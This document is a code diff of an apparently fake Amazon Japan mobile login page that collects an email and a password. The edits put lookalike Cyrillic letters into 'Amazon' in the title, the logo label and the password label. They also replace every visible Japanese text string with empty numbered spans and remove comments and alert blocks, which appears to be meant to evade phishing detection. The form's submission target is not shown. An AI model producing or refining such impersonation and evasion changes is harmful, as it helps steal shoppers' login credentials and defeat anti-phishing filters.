@@ -6,7 +6,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport"
           content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
-    <title dir="ltr">Amazonログイン</title>
+    <title dir="ltr">Amаzоnログイン</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
     <link rel="stylesheet" href="style/css/61ccss.css">
     <link rel="stylesheet" href="style/css/01Scss.css">
@@ -85,7 +85,7 @@
             "                <div id=\"nav-logobar\">\n" +
             "                    <div class=\"nav-left\">\n" +
             "                        <div id=\"nav-logo\">\n" +
-            "                            <a href=\"#\" class=\"nav-logo-link\" aria-label=\"Amazon\">\n" +
+            "                            <a href=\"#\" class=\"nav-logo-link\" aria-label=\"Amаzоn\">\n" +
             "                                <span class=\"nav-sprite nav-logo-base\"></span>\n" +
             "                                <span class=\"nav-sprite nav-logo-ext\"></span>\n" +
             "                                <span class=\"nav-logo-locale\">.co.jp</span>\n" +
@@ -94,10 +94,8 @@
             "                    </div>\n" +
             "                    <div class=\"nav-right\"></div>\n" +
             "                </div>\n" +
-            "                <!--NAVYAAN-SUBNAV-AND-SMILE-FROM-GURUPA-->\n" +
             "            </div>\n" +
             "        </header>\n" +
-            "        <!-- end runtime backup navbar -->\n" +
             "    </div>\n" +
             "\n" +
             "    <div class=\"a-container\">\n" +
@@ -105,42 +103,16 @@
             "        <div class=\"a-section a-spacing-none auth-pagelet-mobile-container\"></div>\n" +
             "\n" +
             "        <div class=\"a-section auth-pagelet-mobile-container\">\n" +
-            "            <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->\n" +
-            "            <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->\n" +
-            "            <div id=\"auth-alert-window\" class=\"a-box a-alert a-alert-error\" aria-live=\"assertive\" role=\"alert\">\n" +
-            "                <div class=\"a-box-inner a-alert-container\"><h4 class=\"a-alert-heading\">問題が発生しました。</h4>\n" +
-            "                    <div class=\"a-alert-content\">\n" +
-            "                        <ul class=\"a-unordered-list a-vertical auth-error-messages\" role=\"alert\">\n" +
-            "                            <li id=\"auth-email-missing-alert\">\n" +
-            "                                <span class=\"a-list-item\">お客様のEメールアドレスまたは携帯電話番号を入力してください</span>\n" +
-            "                            </li>\n" +
-            "\n" +
-            "                            <li id=\"auth-email-invalid-email-alert\">\n" +
-            "                                <span class=\"a-list-item\">Eメールアドレスまたは携帯電話番号が無効です。</span>\n" +
-            "                            </li>\n" +
-            "\n" +
-            "                            <li id=\"auth-password-missing-alert\">\n" +
-            "                                <span class=\"a-list-item\">パスワードを入力してください</span>\n" +
-            "                            </li>\n" +
-            "\n" +
-            "                            <li id=\"auth-guess-missing-alert\">\n" +
-            "                                <span class=\"a-list-item\">画像に表示されている文字を半角で入力してください。</span>\n" +
-            "                            </li>\n" +
-            "                        </ul>\n" +
-            "                    </div>\n" +
-            "                </div>\n" +
-            "            </div>\n" +
-            "            <!-- show a warning modal dialog when the third party account is connected with Amazon -->\n" +
             "            <form name=\"signineml\" method=\"post\" id=\"signineml\" novalidate=\"\" action=\"#\"\n" +
             "                  class=\"auth-validate-form auth-clearable-form\" data-fwcim-id=\"tAzQmSig\">\n" +
-            "                <h1 class=\"a-spacing-micro a-spacing-top-small a-text-left\"></span>ログイン</h1>\n" +
+            "                <h1 class=\"a-spacing-micro a-spacing-top-small a-text-left\"><span class='signin1'></span></h1>\n" +
             "                <div class=\"a-section a-spacing-base a-text-right\">\n" +
             "                    <a id=\"auth-fpp-link-bottom\" class=\"a-link-normal\" target=\"_top\" tabindex=\"9\"\n" +
-            "                       href=\"#\">パスワードを忘れた方</a>\n" +
+            "                       href=\"#\"><span class='signin2'></span></a>\n" +
             "                </div>\n" +
             "\n" +
             "                <div class=\"a-input-text-group a-spacing-medium a-spacing-top-micro\">\n" +
-            "                    <label for=\"ap_email\" class=\"a-form-label auth-mobile-label\">Eメールまたは携帯番号アカウントの番号</label>\n" +
+            "                    <label for=\"ap_email\" class=\"a-form-label auth-mobile-label\"><span class='signin3'></span></label>\n" +
             "\n" +
             "                    <div class=\"a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container\">\n" +
             "                        <input type=\"text\" maxlength=\"128\"\n" +
@@ -153,12 +125,12 @@
             "                        <i class=\"a-icon a-icon-close\" role=\"img\"></i>\n" +
             "                    </div>\n" +
             "\n" +
-            "                    <label for=\"ap_password\" class=\"a-form-label auth-mobile-label\">Amazonのパスワード</label>\n" +
+            "                    <label for=\"ap_password\" class=\"a-form-label auth-mobile-label\">Amаzоnのパスワード</label>\n" +
             "\n" +
             "                    <div id=\"auth-password-container\"\n" +
             "                         class=\"a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password\">\n" +
             "                        <input type=\"password\" class=\"a-input-text a-span12 auth-autofocus auth-required-field\"\n" +
-            "                               maxlength=\"1024\" id=\"password\" placeholder=\"Amazonのパスワード\" name=\"password\" tabindex=\"2\"\n" +
+            "                               maxlength=\"1024\" id=\"password\" placeholder=\"Amаzоnのパスワード\" name=\"password\" tabindex=\"2\"\n" +
             "                               onchange=\"passvaluechange()\">\n" +
             "\n" +
             "                        <div id=\"ap_password_icon\" class=\"auth-clear-icons\" style=\"display: none;\">\n" +
@@ -182,7 +154,7 @@
             "                         aria-live=\"assertive\" role=\"alert\">\n" +
             "                        <div class=\"a-box-inner a-alert-container\">\n" +
             "                            <i class=\"a-icon a-icon-alert\"></i>\n" +
-            "                            <div class=\"a-alert-content\">パスワードを入力してください</div>\n" +
+            "                            <div class=\"a-alert-content\"><span class='signin4'></span></div>\n" +
             "                        </div>\n" +
             "                    </div>\n" +
             "\n" +
@@ -198,7 +170,7 @@
             "                                <input id=\"auth-show-password-checkbox\" type=\"checkbox\" name=\"\" checked=\"\" value=\"\"\n" +
             "                                       tabindex=\"3\" onclick=\"passchange();\">\n" +
             "                                <i class=\"a-icon a-icon-checkbox\"></i>\n" +
-            "                                <span class=\"a-label a-checkbox-label\">パスワードを表示</span>\n" +
+            "                                <span class=\"a-label a-checkbox-label\"><span class='signin5'></span></span>\n" +
             "                            </label>\n" +
             "                        </div>\n" +
             "                    </div>\n" +
@@ -210,19 +182,11 @@
             "                        <label>\n" +
             "                            <input type=\"checkbox\" name=\"rememberMe\" value=\"true\" tabindex=\"4\">\n" +
             "                            <i class=\"a-icon a-icon-checkbox\"></i>\n" +
-            "                            <span class=\"a-label a-checkbox-label\">ログインしたままにする\n" +
+            "                            <span class=\"a-label a-checkbox-label\"><span class='signin6'></span>\n" +
             "                                <span class=\"a-declarative\" data-action=\"a-modal\"\n" +
             "                                      data-a-modal=\"{&quot;max-width&quot;:&quot;500px&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;[ログインしたままにする] チェックボックス&quot;}\">\n" +
-            "                                <a id=\"remember_me_learn_more_link\" class=\"a-link-normal\" href=\"#\">詳細</a></span>\n" +
+            "                                <a id=\"remember_me_learn_more_link\" class=\"a-link-normal\" href=\"#\"><span class='signin7'></span></a></span>\n" +
             "\n" +
-            "                                <div class=\"a-popover-preload\" id=\"a-popover-remember-me-detail-link-modal\">\n" +
-            "                                    <div class=\"a-section a-spacing-large a-spacing-top-mini\">\n" +
-            "                                        <p></p>\n" +
-            "                                        <p>「ログインしたままにする」を選択すると、このデバイスでログインが求められる回数が減ります。</p>\n" +
-            "                                        <p>お客様のアカウントのセキュリティを保つため、個人でお使いのデバイスでのみこのオプションを使うようにしてください。</p>\n" +
-            "                                        <p></p>\n" +
-            "                                    </div>\n" +
-            "                                </div>\n" +
             "                            </span>\n" +
             "                        </label>\n" +
             "                    </div>\n" +
@@ -239,14 +203,14 @@
             "                                <input id=\"signInSubmit\" tabindex=\"6\" class=\"a-button-input\" type=\"submit\"\n" +
             "                                       aria-labelledby=\"auth-signin-button-announce\">\n" +
             "                                <span id=\"auth-signin-button-announce\" class=\"a-button-text\"\n" +
-            "                                      aria-hidden=\"true\">ログイン</span>\n" +
+            "                                      aria-hidden=\"true\"><span class='signin8'></span></span>\n" +
             "                            </span>\n" +
             "                        </span>\n" +
             "\n" +
             "                        <div class=\"a-section a-spacing-medium\">\n" +
             "\n" +
             "                            <div id=\"legalTextRow\" class=\"a-row a-spacing-top-medium a-size-small\">\n" +
-            "                                続行することで、 Amazonの<a href=\"#\">利用規約</a>および<a href=\"#\">プライバシー規約</a>に同意するものとみなされます。\n" +
+            "                                <span class='signin9'></span><a href=\"#\"><span class='signin10'></span></a><span class='signin11'></span><a href=\"#\"><span class='signin12'></span></a><span class='signin13'></span>\n" +
             "                            </div>\n" +
             "\n" +
             "                        </div>\n" +
@@ -254,12 +218,12 @@
             "                        <div class=\"a-section a-spacing-medium a-text-center\">\n" +
             "\n" +
             "                            <div class=\"a-divider a-divider-break\">\n" +
-            "                                <h5>Amazonの新しいお客様ですか？</h5>\n" +
+            "                                <h5><span class='signin14'></span></h5>\n" +
             "                            </div>\n" +
             "                            <span id=\"auth-create-account-link\" class=\"a-button a-button-span12 a-button-base\">\n" +
             "                                <span class=\"a-button-inner\">\n" +
             "                                    <a id=\"createAccountSubmit\" tabindex=\"7\" href=\"#\" class=\"a-button-text\"\n" +
-            "                                       role=\"button\">新しいAmazonのアカウントを作成</a>\n" +
+            "                                       role=\"button\"><span class='signin15'></span></a>\n" +
             "                                </span>\n" +
             "                            </span>\n" +
             "\n" +
@@ -285,9 +249,9 @@
             "                    </style>\n" +
             "                    <a href=\"#\" class=\"icp-button\" id=\"icp-touch-link-language\">\n" +
             "                        <div class=\"icp-nav-globe-img-2 icp-button-globe-2\"></div>\n" +
-            "                        <span class=\"icp-color-base\">日本語</span>\n" +
+            "                        <span class=\"icp-color-base\"><span class='signin16'></span></span>\n" +
             "                        <span class=\"nav-arrow icp-up-down-arrow\"></span>\n" +
-            "                        <span class=\"aok-hidden\" style=\"display:none\">ショッピングのための言語を選択します。</span>\n" +
+            "                        <span class=\"aok-hidden\" style=\"display:none\"><span class='signin17'></span></span>\n" +
             "                    </a>\n" +
             "                    <style type=\"text/css\">\n" +
             "                        /*#icp-touch-link-country { display: none; }*/\n" +
@@ -295,26 +259,26 @@
             "                    <a href=\"#\" class=\"icp-button\" id=\"icp-touch-link-country\">\n" +
             "                        <span class=\"icp-flag-3 icp-flag-3-jp\"></span>\n" +
             "                        <span class=\"icp-color-base\">日本</span>\n" +
-            "                        <span class=\"aok-hidden\" style=\"display:none\">ショッピングのための国/地域を選択します。</span>\n" +
+            "                        <span class=\"aok-hidden\" style=\"display:none\"><span class='signin18'></span></span>\n" +
             "                    </a>\n" +
             "                </div>\n" +
             "                <ul class=\"nav-ftr-horiz nav-ftr-big \">\n" +
             "                    <li class=\"nav-li \">\n" +
-            "                        <a href=\"#\" class=\"nav-a\">検索・閲覧履歴</a>\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin19'></span></a>\n" +
             "                    </li>\n" +
             "                </ul>\n" +
             "                <ul class=\"nav-ftr-horiz \">\n" +
             "                    <li class=\"nav-li \">\n" +
-            "                        <a href=\"#\" class=\"nav-a\">利用規約</a>\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin20'></span></a>\n" +
             "                    </li>\n" +
             "                    <li class=\"nav-li \">\n" +
-            "                        <a href=\"#\" class=\"nav-a\">プライバシー規約</a>\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin21'></span></a>\n" +
             "                    </li>\n" +
             "                    <li class=\"nav-li \">\n" +
-            "                        <a href=\"#\" class=\"nav-a\">パーソナライズド広告規約</a>\n" +
+            "                        <a href=\"#\" class=\"nav-a\"><span class='signin22'></span></a>\n" +
             "                    </li>\n" +
             "                </ul>\n" +
-            "                <div id=\"nav-ftr-copyright\">© 2000-2021, Amazon.com, Inc. and its affiliates</div>\n" +
+            "                <div id=\"nav-ftr-copyright\"><span class='signin23'></span></div>\n" +
             "            </div>\n" +
             "        </footer>\n" +
             "    </div>" +
